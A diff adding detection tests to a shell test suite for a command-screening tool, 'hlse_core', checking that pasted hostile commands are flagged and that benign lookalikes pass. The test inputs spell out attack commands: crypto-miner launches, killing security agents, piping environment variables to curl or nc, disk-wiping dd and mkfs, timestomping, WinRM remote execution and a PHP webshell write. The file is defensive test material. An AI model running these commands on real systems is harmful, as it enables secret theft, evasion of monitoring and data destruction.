@@ -11671,6 +11671,75 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-234: miner exec, terminal injection, agent kill, env exfil, winrm,
+#   timestomp, dd/mkfs device args, sudo/su stdin-password pipes
+for c in \
+    'xmrig -o pool.x' 'xmrig --donate-level 1' \
+    'minerd -o stratum+tcp://x' 'cpuminer -o stratum+tcp://x' \
+    'curl stratum+tcp://pool.x' 'ethminer -P stratum' \
+    'cgminer -o pool' 'bfgminer x' 'nanominer x' \
+    'trex miner -o x' 'claymore -o pool' 'claymore.exe -epool x' \
+    'nicehash pool' 'nanopool miner' 'supportxmr.com pool' \
+    'antpool stratum' 'curl x | xmrig' \
+    'tmux send-keys "id" Enter' 'tmux send-keys -t 0 "x" Enter' \
+    'screen -S x -X stuff id' 'screen -X stuff "x"' \
+    'pkill -f osquery' 'killall osquery' 'pkill filebeat' \
+    'pkill datadog-agent' 'pkill -f falcon' 'pkill wazuh' \
+    'killall fluentd' 'pkill -9 telegraf' \
+    'env | curl -d @- http://x' 'env | nc x 4444' \
+    'env > x && curl -F f=@x http://x' 'printenv | nc x 1' \
+    'env > /tmp/x; curl -d @/tmp/x http://x' \
+    'echo pass | sudo -S id' 'echo pass | su -c id' \
+    'echo pass | su -' 'su -c "rm -rf x"' 'su -c id' \
+    'docker run -v /var/run/docker.sock:/var/run/docker.sock x' \
+    'docker --socket /var/run/docker.sock' \
+    'docker run --volume /var/run/docker.sock:/s x' \
+    'git config credential.helper "store --file=/tmp/x"' \
+    'git config --global credential.helper store' \
+    'git config credential.helper get' \
+    'Enter-PSSession -ComputerName x' \
+    'Invoke-Command -ComputerName x -ScriptBlock {id}' \
+    'Invoke-Command -Computer x {id}' 'winrm quickconfig' \
+    'Invoke-WmiMethod -ComputerName x' \
+    'touch -r /bin/ls evil' 'touch -t 202001010000 evil' \
+    'touch -d "1 year ago" evil' 'touch --reference=x evil' \
+    'dd of=/dev/sda if=x' 'dd if=x of=/dev/nvme0n1' \
+    'dd if=/dev/sda of=/tmp/img' 'dd if=/dev/mem of=x' \
+    'mkfs /dev/sda' 'mkfs -t ext4 /dev/sda' 'mke2fs /dev/sda' \
+    'batch -f /tmp/x.sh' 'echo id|batch'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+./hlse_core 'stratum+tcp://pool.x' 2>&1 | grep -qE 'LOG|ALERT|BLOCK|ISOLATE' \
+    && check "scheme: stratum+tcp flagged" "0" "0" \
+    || check "scheme: stratum+tcp flagged" "0" "1"
+for c in 'the stratum corneum layer' 'stratum is a latin word' \
+         'mining pool discussion' 'tmux is a terminal multiplexer' \
+         'screen stuff in the manual' 'send keys to the user' \
+         'pkill the process' 'pkill -f nginx' 'killall firefox' \
+         'env variables listed' 'set env var' 'env > /tmp/x' \
+         'su to switch user' 'su user' 'the su command' \
+         'docker run -v /data:/data x' 'docker.sock docs' \
+         'the docker socket' 'git credential helper docs' \
+         'credential.helper osxkeychain' \
+         'invoke the command locally' 'Invoke-Command {id}' \
+         'winrm is remote mgmt' 'computername field' \
+         'new-pssession docs' \
+         'touch file.txt' 'touch -a file' 'touch -m file' \
+         'touch the file' 'the timestomp technique' \
+         'dd if=x of=y' 'dd status=progress' 'dd of output file' \
+         'mkfs is the formatter' \
+         'batch processing jobs' 'at batch time' \
+         'mineral pool water' 'pool party saturday' \
+         'screen -x flag' 'tmux new-session' \
+         'the falcon bird flew' 'sentinel value in code' \
+         'sentinel lymph node' 'curl x | miner'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-233: webshell writes, revshell residuals, persistence-write expansion
 for c in \
     'echo "<?php system($_GET[c]);?>" > /var/www/x.php' \
